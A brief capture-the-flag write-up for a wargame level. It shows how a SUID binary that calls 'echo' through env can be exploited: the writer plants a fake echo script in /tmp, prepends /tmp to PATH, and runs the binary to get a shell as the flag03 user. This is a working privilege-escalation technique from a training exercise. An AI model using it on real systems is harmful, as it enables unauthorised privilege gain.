 **SUID** binary 
`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`

```bash
strings level03
```

got -> 
`/usr/bin/env echo Exploit me`

This means the **level03** executable is using the **echo** command. So we can manipulate the **PATH** variable and **echo** command. This manipulation will lead us to become flag03 user.


```bash
echo "/bin/bash" > /tmp/echo
chmod 777 /tmp/echo && export PATH=/tmp:$PATH
./level03
```